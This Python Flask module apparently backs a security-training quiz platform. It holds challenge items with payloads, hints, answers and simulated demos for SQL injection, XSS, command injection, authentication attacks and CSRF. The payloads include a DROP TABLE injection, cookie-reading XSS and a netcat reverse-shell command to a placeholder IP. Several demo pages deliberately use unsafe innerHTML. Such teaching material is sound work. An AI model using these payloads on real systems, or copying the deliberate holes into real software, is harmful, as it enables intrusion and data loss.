from flask import current_app
from bson import ObjectId
import csv
import os
import random
import json


def get_db():
    return current_app.config['MONGO_CLIENT'].get_database()


def add_challenge(data):
    db = get_db()
    result = db.challenges.insert_one(data)
    return str(result.inserted_id)


def delete_challenge(challenge_id):
    db = get_db()
    db.challenges.delete_one({'_id': ObjectId(challenge_id)})


def list_challenges():
    db = get_db()
    return list(db.challenges.find({}, {'_id': 0}))


def load_sql_challenges():
    """Load SQL challenges from the CSV file."""
    challenges = []
    csv_path = os.path.join(os.path.dirname(os.path.dirname(current_app.root_path)), 'data',
                            'final_sqli_challenges_unique.csv')

    try:
        with open(csv_path, encoding='utf-8') as file:
            reader = csv.DictReader(file)
            for row in reader:
                challenges.append({
                    'id': row['id'],
                    'category': 'SQL Injection',
                    'payload': row['payload'],
                    'scenario': row['scenario'],
                    'question': row['question'],
                    'answer': row['answer'],
                    'hint': row['hint'],
                    'difficulty': row['difficulty'],
                    'score_weight': int(row['score_weight']),
                    'type': 'sql_injection'
                })
        print(f"Loaded {len(challenges)} SQL challenges")
        return challenges
    except Exception as e:
        print(f"Error loading SQL challenges: {e}")
        return get_fallback_sql_challenges()


def get_fallback_sql_challenges():
    """Return fallback SQL injection challenges."""
    return [
            {
            'id': 'sql_1',
                'category': 'SQL Injection',
                'difficulty': 'Beginner',
            'scenario': 'Login form that checks username and password without proper input validation.',
            'question': 'What would this payload do in a vulnerable system?',
            'payload': "' OR '1'='1' --",
            'hint': 'This makes the WHERE clause always true, bypassing authentication.',
            'score_weight': 10,
            'type': 'sql_injection',
            'answer': 'This payload bypasses authentication by making the WHERE clause always evaluate to true.'
        },
        {
            'id': 'sql_2',
                'category': 'SQL Injection',
                'difficulty': 'Intermediate',
            'scenario': 'A search field where input is directly concatenated into SQL queries.',
            'question': 'What would this payload attempt to do if successful?',
            'payload': "; DROP TABLE users; --",
            'hint': 'The semicolon separates multiple SQL statements, allowing dangerous operations.',
            'score_weight': 20,
            'type': 'sql_injection',
            'answer': 'This payload attempts to drop the users table, causing data loss.'
        },
        {
            'id': 'sql_3',
                'category': 'SQL Injection',
            'difficulty': 'Advanced',
            'scenario': 'Product search function that displays results from a database query.',
            'question': 'How does this attack attempt to extract sensitive information?',
                'payload': "' UNION SELECT username, password FROM users --",
            'hint': 'UNION combines the results of two queries, allowing access to other tables.',
            'score_weight': 30,
            'type': 'sql_injection',
            'answer': 'This payload uses UNION to combine results and extract user credentials.'
        }
    ]


def get_xss_challenges():
    """Return XSS challenges."""
    return [
        {
            'id': 'xss_1',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Beginner',
            'scenario': 'A comment system that displays user input without sanitization.',
            'question': 'What would this payload do when displayed on the page?',
            'payload': '<script>alert("XSS")</script>',
            'hint': 'Look at the HTML tags and think about what happens when they are rendered.',
            'score_weight': 15,
            'type': 'xss',
            'answer': 'This payload would execute JavaScript code, showing an alert popup.',
            'expected_solutions': ['alert', 'javascript', 'script', 'execute', 'popup'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Vulnerable Comment System Demo</h4>
                <div class="comment-box">
                    <p>User Comment: <span id="comment-display">Loading...</span></p>
                </div>
                <div class="input-section">
                    <input type="text" id="comment-input" placeholder="Enter your comment..." />
                    <button onclick="displayComment()">Post Comment</button>
                </div>
            </div>
            <script>
                function displayComment() {
                    const input = document.getElementById('comment-input').value;
                    document.getElementById('comment-display').innerHTML = input;
                }
            </script>
            '''
        },
        {
            'id': 'xss_2',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Intermediate',
            'scenario': 'A profile page that shows user input in HTML context.',
            'question': 'How can you execute JavaScript without using script tags?',
            'payload': '<img src="x" onerror="alert(\'XSS\')">',
            'hint': 'Think about HTML attributes that can execute JavaScript code.',
            'score_weight': 25,
            'type': 'xss',
            'answer': 'This payload uses the onerror event handler to execute JavaScript when the image fails to load.',
            'expected_solutions': ['onerror', 'img', 'event handler', 'image', 'attribute'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Vulnerable Profile Page Demo</h4>
                <div class="profile-section">
                    <p>Bio: <span id="bio-display">Loading...</span></p>
                </div>
                <div class="input-section">
                    <input type="text" id="bio-input" placeholder="Enter your bio..." />
                    <button onclick="updateBio()">Update Bio</button>
                </div>
            </div>
            <script>
                function updateBio() {
                    const input = document.getElementById('bio-input').value;
                    document.getElementById('bio-display').innerHTML = input;
                }
            </script>
            '''
        },
        {
            'id': 'xss_3',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Advanced',
            'scenario': 'A search results page that reflects user input.',
            'question': 'How can you bypass basic XSS filters?',
            'payload': '<svg onload="alert(1)">',
            'hint': 'SVG elements can have event handlers, and some filters miss them.',
            'score_weight': 35,
            'type': 'xss',
            'answer': 'This payload uses an SVG element with an onload event handler to bypass basic script tag filters.',
            'expected_solutions': ['svg', 'onload', 'bypass', 'filter', 'event'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Search Results with Basic Filter Demo</h4>
                <div class="search-results">
                    <p>Search results for: <span id="search-term">Loading...</span></p>
                </div>
                <div class="input-section">
                    <input type="text" id="search-input" placeholder="Enter search term..." />
                    <button onclick="performSearch()">Search</button>
                </div>
                <div class="filter-info">
                    <small>Note: Basic filter removes &lt;script&gt; tags but may miss other elements</small>
                </div>
            </div>
            <script>
                function performSearch() {
                    const input = document.getElementById('search-input').value;
                    // Basic filter that removes script tags
                    const filtered = input.replace(/<script[^>]*>.*?<\/script>/gi, '');
                    document.getElementById('search-term').innerHTML = filtered;
                }
            </script>
            '''
        },
        {
            'id': 'xss_4',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A chat application that allows HTML input.',
            'question': 'How can you perform a stored XSS attack?',
            'payload': '<iframe src="javascript:alert(document.cookie)"></iframe>',
            'hint': 'Think about how to access sensitive information like cookies.',
            'score_weight': 45,
            'type': 'xss',
            'answer': 'This payload creates an iframe that executes JavaScript to access cookies, demonstrating stored XSS.',
            'expected_solutions': ['iframe', 'javascript:', 'cookie', 'stored', 'persistent'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Chat Application Demo</h4>
                <div class="chat-messages" id="chat-messages">
                    <div class="message">System: Welcome to the chat!</div>
                </div>
                <div class="input-section">
                    <input type="text" id="message-input" placeholder="Type your message..." />
                    <button onclick="sendMessage()">Send</button>
                </div>
                <div class="cookie-display">
                    <small>Current cookies: <span id="cookie-info">Loading...</span></small>
                </div>
            </div>
            <script>
                function sendMessage() {
                    const input = document.getElementById('message-input').value;
                    const chatMessages = document.getElementById('chat-messages');
                    const messageDiv = document.createElement('div');
                    messageDiv.className = 'message';
                    messageDiv.innerHTML = input;
                    chatMessages.appendChild(messageDiv);
                    document.getElementById('message-input').value = '';
                }
                
                // Display current cookies
                document.getElementById('cookie-info').textContent = document.cookie || 'No cookies';
            </script>
            '''
        },
        {
            'id': 'xss_5',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A form that uses innerHTML to display user input.',
            'question': 'How can you perform DOM-based XSS?',
            'payload': '<img src=x onerror=alert(1)>',
            'hint': 'DOM-based XSS occurs when JavaScript modifies the DOM based on user input.',
            'score_weight': 50,
            'type': 'xss',
            'answer': 'This payload uses DOM-based XSS by manipulating the innerHTML property to execute JavaScript.',
            'expected_solutions': ['dom', 'innerHTML', 'javascript', 'manipulation', 'client-side'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>DOM-based XSS Demo</h4>
                <div class="form-section">
                    <p>Form Data: <span id="form-data">Loading...</span></p>
                </div>
                <div class="input-section">
                    <input type="text" id="form-input" placeholder="Enter form data..." />
                    <button onclick="processForm()">Process Form</button>
                </div>
                <div class="url-info">
                    <small>Try adding #<img src=x onerror=alert(1)> to the URL</small>
                </div>
            </div>
            <script>
                function processForm() {
                    const input = document.getElementById('form-input').value;
                    document.getElementById('form-data').innerHTML = input;
                }
                
                // Simulate URL hash-based XSS
                window.onhashchange = function() {
                    const hash = window.location.hash.substring(1);
                    if (hash) {
                        document.getElementById('form-data').innerHTML = decodeURIComponent(hash);
                    }
                };
            </script>
            '''
        }
    ]


def get_command_injection_challenges():
    """Return Command Injection challenges."""
    return [
        {
            'id': 'cmd_1',
            'category': 'Command Injection',
            'difficulty': 'Beginner',
            'scenario': 'A ping utility that takes user input for IP addresses.',
            'question': 'What would this payload do in a vulnerable system?',
            'payload': '127.0.0.1; ls',
            'hint': 'The semicolon separates commands in shell environments.',
            'score_weight': 20,
            'type': 'command_injection',
            'answer': 'This payload would ping localhost and then list directory contents.',
            'expected_solutions': ['ping', 'ls', 'semicolon', 'command', 'separator'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Vulnerable Ping Utility Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="ping-output">Ready to ping...</div>
                    <div class="terminal-input-line">
                        <span class="terminal-prefix">$</span>
                        <input type="text" id="ping-input" class="terminal-input" placeholder="Enter IP address..." />
                        <button onclick="executePing()">Execute</button>
                    </div>
                </div>
                <div class="warning">
                    <small>⚠️ This demo simulates command injection. In real systems, this could be dangerous!</small>
                </div>
            </div>
            <script>
                function executePing() {
                    const input = document.getElementById('ping-input').value;
                    const output = document.getElementById('ping-output');
                    
                    // Simulate command execution
                    if (input.includes(';')) {
                        const commands = input.split(';');
                        let result = `PING ${commands[0].trim()}: PONG\\n`;
                        if (commands.length > 1) {
                            result += `Executing: ${commands[1].trim()}\\n`;
                            result += `Directory listing:\\n`;
                            result += `file1.txt  file2.txt  file3.txt\\n`;
                        }
                        output.textContent = result;
                    } else {
                        output.textContent = `PING ${input}: PONG`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_2',
            'category': 'Command Injection',
            'difficulty': 'Intermediate',
            'scenario': 'A file upload system that processes filenames.',
            'question': 'How can you execute multiple commands?',
            'payload': 'file.txt && whoami',
            'hint': 'Think about logical operators in shell commands.',
            'score_weight': 30,
            'type': 'command_injection',
            'answer': 'This payload uses && to execute whoami only if the first command succeeds.',
            'expected_solutions': ['&&', 'whoami', 'logical', 'operator', 'conditional'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>File Upload System Demo</h4>
                <div class="upload-section">
                    <div class="file-info" id="file-info">No file selected</div>
                    <div class="terminal">
                        <div class="terminal-output" id="upload-output">Ready to process file...</div>
                    </div>
                </div>
                <div class="input-section">
                    <input type="text" id="filename-input" placeholder="Enter filename..." />
                    <button onclick="processFile()">Process File</button>
                </div>
                <div class="info">
                    <small>Try: file.txt && whoami</small>
                </div>
            </div>
            <script>
                function processFile() {
                    const input = document.getElementById('filename-input').value;
                    const fileInfo = document.getElementById('file-info');
                    const output = document.getElementById('upload-output');
                    
                    if (input.includes('&&')) {
                        const parts = input.split('&&');
                        fileInfo.textContent = `Processing file: ${parts[0].trim()}`;
                        output.textContent = `File processed successfully\\nExecuting: ${parts[1].trim()}\\nCurrent user: admin`;
                    } else {
                        fileInfo.textContent = `Processing file: ${input}`;
                        output.textContent = `File processed successfully`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_3',
            'category': 'Command Injection',
            'difficulty': 'Advanced',
            'scenario': 'A system monitoring tool that accepts hostnames.',
            'question': 'How can you bypass command injection filters?',
            'payload': '$(whoami)',
            'hint': 'Command substitution can execute commands within other commands.',
            'score_weight': 40,
            'type': 'command_injection',
            'answer': 'This payload uses command substitution to execute whoami and insert the result.',
            'expected_solutions': ['$()', 'substitution', 'bypass', 'filter', 'execute'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>System Monitoring Tool Demo</h4>
                <div class="monitoring-section">
                    <div class="terminal">
                        <div class="terminal-output" id="monitor-output">System monitoring ready...</div>
                    </div>
                </div>
                <div class="input-section">
                    <input type="text" id="hostname-input" placeholder="Enter hostname..." />
                    <button onclick="monitorHost()">Monitor Host</button>
                </div>
                <div class="filter-info">
                    <small>Note: Basic filters block semicolons and && but may miss $()</small>
                </div>
            </div>
            <script>
                function monitorHost() {
                    const input = document.getElementById('hostname-input').value;
                    const output = document.getElementById('monitor-output');
                    
                    if (input.includes('$(') && input.includes(')')) {
                        const command = input.match(/\\$\\(([^)]+)\\)/);
                        if (command) {
                            output.textContent = `Monitoring host: ${input}\\nExecuting: ${command[1]}\\nResult: admin\\nHost status: Online`;
                        }
                    } else {
                        output.textContent = `Monitoring host: ${input}\\nHost status: Online`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_4',
            'category': 'Command Injection',
            'difficulty': 'Expert',
            'scenario': 'A network diagnostic tool.',
            'question': 'How can you perform a reverse shell attack?',
            'payload': 'nc -e /bin/sh 192.168.1.100 4444',
            'hint': 'Netcat can be used to create network connections and execute shells.',
            'score_weight': 50,
            'type': 'command_injection',
            'answer': 'This payload attempts to create a reverse shell connection to an attacker-controlled system.',
            'expected_solutions': ['netcat', 'reverse', 'shell', 'connection', 'nc'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Network Diagnostic Tool Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="net-output">Network diagnostic ready...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="net-input" placeholder="Enter network command..." />
                    <button onclick="executeNetCommand()">Execute</button>
                </div>
                <div class="warning">
                    <small>⚠️ This demonstrates reverse shell techniques. Only use for authorized testing!</small>
                </div>
            </div>
            <script>
                function executeNetCommand() {
                    const input = document.getElementById('net-input').value;
                    const output = document.getElementById('net-output');
                    
                    if (input.includes('nc') && input.includes('-e')) {
                        output.textContent = `Executing: ${input}\\nAttempting reverse shell connection...\\nConnection failed (simulated)\\nThis would create a shell connection to the specified host`;
                    } else {
                        output.textContent = `Executing: ${input}\\nCommand completed`;
                    }
                }
            </script>
            '''
        }
    ]


def get_authentication_challenges():
    """Return Authentication challenges."""
    return [
        {
            'id': 'auth_1',
            'category': 'Authentication Attacks',
            'difficulty': 'Beginner',
            'scenario': 'A login form with weak password requirements.',
            'question': 'What is the most common weak password?',
            'payload': 'password',
            'hint': 'Think about the most obvious and commonly used passwords.',
            'score_weight': 10,
            'type': 'authentication',
            'answer': 'Password is one of the most commonly used weak passwords.',
            'expected_solutions': ['password', '123456', 'admin', 'weak', 'common'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Weak Password Login Demo</h4>
                <div class="login-form">
                    <div class="form-group">
                        <label>Username:</label>
                        <input type="text" id="username" placeholder="Enter username" />
                    </div>
                    <div class="form-group">
                        <label>Password:</label>
                        <input type="password" id="password" placeholder="Enter password" />
                    </div>
                    <button onclick="attemptLogin()">Login</button>
                </div>
                <div class="result" id="login-result"></div>
                <div class="common-passwords">
                    <h5>Common Weak Passwords:</h5>
                    <ul>
                        <li>password</li>
                        <li>123456</li>
                        <li>admin</li>
                        <li>qwerty</li>
                        <li>letmein</li>
                    </ul>
                </div>
            </div>
            <script>
                function attemptLogin() {
                    const username = document.getElementById('username').value;
                    const password = document.getElementById('password').value;
                    const result = document.getElementById('login-result');
                    
                    const weakPasswords = ['password', '123456', 'admin', 'qwerty', 'letmein'];
                    
                    if (weakPasswords.includes(password.toLowerCase())) {
                        result.innerHTML = '<div class="success">✅ Login successful! (Weak password detected)</div>';
                    } else {
                        result.innerHTML = '<div class="error">❌ Login failed. Try a common password.</div>';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_2',
            'category': 'Authentication Attacks',
            'difficulty': 'Intermediate',
            'scenario': 'A system that allows unlimited login attempts.',
            'question': 'What attack can be performed with unlimited attempts?',
            'payload': 'Brute Force Attack',
            'hint': 'Think about systematically trying different credentials.',
            'score_weight': 20,
            'type': 'authentication',
            'answer': 'Brute force attacks systematically try different username/password combinations.',
            'expected_solutions': ['brute force', 'dictionary', 'systematic', 'attempts', 'credentials'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Brute Force Attack Demo</h4>
                <div class="attack-simulation">
                    <div class="login-form">
                        <div class="form-group">
                            <label>Username:</label>
                            <input type="text" id="bf-username" placeholder="admin" />
                        </div>
                        <div class="form-group">
                            <label>Password:</label>
                            <input type="password" id="bf-password" placeholder="Enter password" />
                        </div>
                        <button onclick="attemptBruteForce()">Attempt Login</button>
                    </div>
                    <div class="attack-log" id="attack-log">
                        <h5>Attack Log:</h5>
                        <div id="log-content">Ready to start brute force attack...</div>
                    </div>
                </div>
                <div class="info">
                    <small>This demo shows how unlimited login attempts enable brute force attacks</small>
                </div>
            </div>
            <script>
                let attemptCount = 0;
                const commonPasswords = ['password', '123456', 'admin', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon'];
                
                function attemptBruteForce() {
                    const username = document.getElementById('bf-username').value;
                    const password = document.getElementById('bf-password').value;
                    const logContent = document.getElementById('log-content');
                    
                    attemptCount++;
                    const logEntry = `Attempt ${attemptCount}: ${username}/${password} - `;
                    
                    if (password === 'admin123' || commonPasswords.includes(password.toLowerCase())) {
                        logContent.innerHTML += logEntry + '<span class="success">SUCCESS!</span><br>';
                        logContent.innerHTML += '<div class="warning">⚠️ Brute force attack successful!</div>';
                    } else {
                        logContent.innerHTML += logEntry + '<span class="error">FAILED</span><br>';
                    }
                    
                    if (attemptCount >= 10) {
                        logContent.innerHTML += '<div class="info">💡 In real systems, rate limiting would prevent this attack</div>';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_3',
            'category': 'Authentication Attacks',
            'difficulty': 'Advanced',
            'scenario': 'A password reset system.',
            'question': 'How can you bypass password reset functionality?',
            'payload': 'Predictable Reset Tokens',
            'hint': 'Think about how reset tokens are generated and if they can be guessed.',
            'score_weight': 30,
            'type': 'authentication',
            'answer': 'Predictable or weak reset tokens can be guessed or brute-forced.',
            'expected_solutions': ['predictable', 'token', 'reset', 'guess', 'brute force'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Password Reset Token Demo</h4>
                <div class="reset-form">
                    <div class="form-group">
                        <label>Email:</label>
                        <input type="email" id="reset-email" placeholder="user@example.com" />
                    </div>
                    <button onclick="requestReset()">Request Password Reset</button>
                </div>
                <div class="token-display" id="token-display"></div>
                <div class="token-attack">
                    <h5>Token Attack Simulation:</h5>
                    <div class="form-group">
                        <label>Reset Token:</label>
                        <input type="text" id="reset-token" placeholder="Enter reset token" />
                    </div>
                    <button onclick="attemptTokenBypass()">Attempt Reset</button>
                </div>
                <div class="result" id="reset-result"></div>
            </div>
            <script>
                function requestReset() {
                    const email = document.getElementById('reset-email').value;
                    const tokenDisplay = document.getElementById('token-display');
                    
                    // Simulate weak token generation (timestamp-based)
                    const weakToken = Date.now().toString().slice(-6);
                    tokenDisplay.innerHTML = `
                        <div class="token-info">
                            <h6>Reset Token Generated:</h6>
                            <code>${weakToken}</code>
                            <small>⚠️ This token is predictable and can be guessed!</small>
                        </div>
                    `;
                }
                
                function attemptTokenBypass() {
                    const token = document.getElementById('reset-token').value;
                    const result = document.getElementById('reset-result');
                    
                    // Simulate token validation
                    if (token.length === 6 && /^\\d+$/.test(token)) {
                        result.innerHTML = '<div class="success">✅ Token accepted! Password reset successful.</div>';
                        result.innerHTML += '<div class="warning">⚠️ Weak token generation made this attack possible!</div>';
                    } else {
                        result.innerHTML = '<div class="error">❌ Invalid token format.</div>';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_4',
            'category': 'Authentication Attacks',
            'difficulty': 'Expert',
            'scenario': 'A session management system.',
            'question': 'How can you hijack user sessions?',
            'payload': 'Session Fixation Attack',
            'hint': 'Think about how session IDs are generated and managed.',
            'score_weight': 40,
            'type': 'authentication',
            'answer': 'Session fixation attacks force users to use attacker-controlled session IDs.',
            'expected_solutions': ['session', 'fixation', 'hijack', 'id', 'cookie'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Session Management Demo</h4>
                <div class="session-info">
                    <h5>Current Session:</h5>
                    <div id="session-display">No session active</div>
                </div>
                <div class="session-actions">
                    <button onclick="createSession()">Create Session</button>
                    <button onclick="showSessionId()">Show Session ID</button>
                    <button onclick="simulateFixation()">Simulate Fixation Attack</button>
                </div>
                <div class="attack-log" id="session-log">
                    <h5>Session Attack Log:</h5>
                    <div id="session-log-content">Ready to demonstrate session attacks...</div>
                </div>
            </div>
            <script>
                let currentSession = null;
                
                function createSession() {
                    currentSession = {
                        id: 'SESS_' + Math.random().toString(36).substr(2, 9),
                        created: new Date().toLocaleTimeString(),
                        user: 'demo_user'
                    };
                    document.getElementById('session-display').innerHTML = `
                        <strong>Session ID:</strong> ${currentSession.id}<br>
                        <strong>Created:</strong> ${currentSession.created}<br>
                        <strong>User:</strong> ${currentSession.user}
                    `;
                }
                
                function showSessionId() {
                    if (currentSession) {
                        alert(`Current Session ID: ${currentSession.id}`);
                    } else {
                        alert('No active session');
                    }
                }
                
                function simulateFixation() {
                    const logContent = document.getElementById('session-log-content');
                    if (currentSession) {
                        logContent.innerHTML += `
                            <div class="attack-step">
                                <strong>Step 1:</strong> Attacker forces victim to use session ID: ${currentSession.id}<br>
                                <strong>Step 2:</strong> Victim logs in with attacker's session ID<br>
                                <strong>Step 3:</strong> Attacker now has access to victim's session!<br>
                                <span class="warning">⚠️ Session fixation attack successful!</span>
                            </div>
                        `;
                    } else {
                        logContent.innerHTML += '<div class="error">❌ No active session to attack</div>';
                    }
                }
            </script>
            '''
        }
    ]


def get_csrf_challenges():
    """Return CSRF challenges."""
    return [
        {
            'id': 'csrf_1',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Beginner',
            'scenario': 'A banking application without CSRF protection.',
            'question': 'What attack can change user data without their knowledge?',
            'payload': 'Cross-Site Request Forgery',
            'hint': 'Think about requests that are made from other sites.',
            'score_weight': 15,
            'type': 'csrf',
            'answer': 'CSRF allows attackers to perform actions on behalf of authenticated users.'
        },
        {
            'id': 'csrf_2',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Intermediate',
            'scenario': 'A form that changes user settings.',
            'question': 'How can you protect against CSRF attacks?',
            'payload': 'CSRF Tokens',
            'hint': 'Think about unique, unpredictable values that verify request authenticity.',
            'score_weight': 25,
            'type': 'csrf',
            'answer': 'CSRF tokens are unique values that verify requests come from legitimate sources.'
        }
    ]


def get_all_challenges():
    """Get all available challenges from all categories."""
    all_challenges = []
    
    # Add SQL challenges
    all_challenges.extend(load_sql_challenges())
    
    # Add XSS challenges
    all_challenges.extend(get_xss_challenges())
    
    # Add Command Injection challenges
    all_challenges.extend(get_command_injection_challenges())
    
    # Add Authentication challenges
    all_challenges.extend(get_authentication_challenges())
    
    # Add CSRF challenges
    all_challenges.extend(get_csrf_challenges())
    
    return all_challenges


def get_challenges_by_category(category):
    """Get challenges by specific category."""
    category_map = {
        'sql_injection': load_sql_challenges,
        'xss': get_xss_challenges,
        'command_injection': get_command_injection_challenges,
        'authentication': get_authentication_challenges,
        'csrf': get_csrf_challenges
    }
    
    if category in category_map:
        return category_map[category]()
    
    return []


def get_random_challenge(difficulty=None, category=None):
    """Get a random challenge, optionally filtered by difficulty and category."""
    if category:
        challenges = get_challenges_by_category(category)
    else:
        challenges = get_all_challenges()

    if difficulty:
        filtered_challenges = [c for c in challenges if c['difficulty'].lower() == difficulty.lower()]
        if filtered_challenges:
            challenges = filtered_challenges

    if not challenges:
        return None

    return random.choice(challenges)


def get_challenge_by_id(challenge_id):
    """Get a specific challenge by ID."""
    all_challenges = get_all_challenges()
    for challenge in all_challenges:
        if challenge['id'] == str(challenge_id):
            return challenge
    return None


def get_challenges_by_difficulty(difficulty):
    """Get all challenges of a specific difficulty level."""
    all_challenges = get_all_challenges()
    return [c for c in all_challenges if c['difficulty'].lower() == difficulty.lower()]


def get_user_appropriate_challenges(user, limit=5):
    """Get challenges appropriate for a user's skill level using AI recommendations."""
    try:
        from app.routes.ai_model import ai_recommendation_ml
        recommended_difficulty = ai_recommendation_ml(user)
    except:
        # Fallback based on user level
        user_level = user.get('level', 1)
        if user_level >= 8:
            recommended_difficulty = 'expert'
        elif user_level >= 6:
            recommended_difficulty = 'advanced'
        elif user_level >= 4:
            recommended_difficulty = 'intermediate'
        else:
            recommended_difficulty = 'beginner'
    
    # Get challenges of recommended difficulty
    challenges = get_challenges_by_difficulty(recommended_difficulty)
    
    # If not enough challenges, add some from adjacent difficulty levels
    if len(challenges) < limit:
        if recommended_difficulty == 'beginner':
            challenges.extend(get_challenges_by_difficulty('intermediate')[:2])
        elif recommended_difficulty == 'intermediate':
            challenges.extend(get_challenges_by_difficulty('beginner')[:1])
            challenges.extend(get_challenges_by_difficulty('advanced')[:1])
        elif recommended_difficulty == 'advanced':
            challenges.extend(get_challenges_by_difficulty('intermediate')[:2])
            challenges.extend(get_challenges_by_difficulty('expert')[:1])
        elif recommended_difficulty == 'expert':
            challenges.extend(get_challenges_by_difficulty('advanced')[:3])
    
    # Randomize and limit
    random.shuffle(challenges)
    return challenges[:limit]


def get_challenge_statistics():
    """Get statistics about available challenges."""
    all_challenges = get_all_challenges()
    
    stats = {
        'total': len(all_challenges),
        'by_category': {},
        'by_difficulty': {}
    }
    
    for challenge in all_challenges:
        # Count by category
        category = challenge['category']
        if category not in stats['by_category']:
            stats['by_category'][category] = 0
        stats['by_category'][category] += 1
        
        # Count by difficulty
        difficulty = challenge['difficulty']
        if difficulty not in stats['by_difficulty']:
            stats['by_difficulty'][difficulty] = 0
        stats['by_difficulty'][difficulty] += 1
    
    return stats
